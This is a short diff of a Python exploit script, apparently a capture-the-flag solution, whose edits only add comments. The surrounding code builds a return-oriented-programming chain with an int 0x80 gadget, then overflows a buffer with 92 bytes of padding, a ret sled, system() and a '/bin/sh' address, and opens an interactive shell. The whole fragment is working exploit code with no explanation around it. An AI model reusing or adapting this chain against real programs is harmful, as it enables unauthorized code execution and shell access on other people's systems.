@@ -30,7 +30,7 @@ rop += "aaaa"
 rop += p32(pop_ebx)
 rop += "aaaa"
 rop += p32(xor_ebx_ebp)
-rop += p32(inc_esi_int_0x80)
+rop += p32(inc_esi_int_0x80) # call read to rop again 
 rop += p32(add_esp)
 payload += rop
 print payload
@@ -40,7 +40,7 @@ system = base + 0x00b85e0
 sh = base + 0x15d7ec
 ret = base + 0x17070 
 payload = "a"*92
-payload += p32(ret)*30 + p32(system)*2 + p32(sh) + p32(0)*3
+payload += p32(ret)*30 + p32(system)*2 + p32(sh) + p32(0)*3 # rop
 r.send(payload)
 r.interactive()
 
